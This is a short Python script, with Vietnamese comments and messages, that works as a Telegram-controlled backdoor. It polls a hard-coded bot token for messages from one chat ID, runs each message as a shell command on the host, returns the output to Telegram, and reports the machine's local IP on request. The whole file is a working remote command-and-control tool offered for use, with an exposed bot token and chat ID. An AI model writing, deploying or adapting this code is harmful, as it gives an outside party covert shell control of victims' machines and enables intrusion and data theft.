import requests
import subprocess
import time
import socket

BOT_TOKEN = "7916172515:AAF1e1Nj8K_F8Xr2LGQyLTKBlYTn9ZlOrIU"
CHAT_ID = "5197540151"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return "Error getting IP: " + str(e)

def get_updates():
    global last_update_id
    params = {"timeout": 100, "offset": last_update_id}
    try:
        response = requests.get(f"{API_URL}/getUpdates", params=params, timeout=15)
        return response.json()
    except Exception as e:
        return {"result": []}

def send_message(text):
    requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text})

def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
        return output.strip()
    except subprocess.CalledProcessError as e:
        return e.output.strip()
    except Exception as e:
        return "Error: " + str(e)

def main():
    global last_update_id
    while True:
        updates = get_updates()
        for update in updates.get("result", []):
            last_update_id = update["update_id"] + 1
            message = update.get("message", {})
            text = message.get("text", "")
            sender = str(message.get("chat", {}).get("id", ""))

            if sender != CHAT_ID:
                continue  # Bỏ qua người gửi lạ

            if text.lower() == "ip":
                ip = get_local_ip()
                send_message("📶 Local IP: " + ip)
            else:
                output = run_command(text)
                send_message("📥 Kết quả:\n" + output)

        time.sleep(2)

if __name__ == "__main__":
    main()
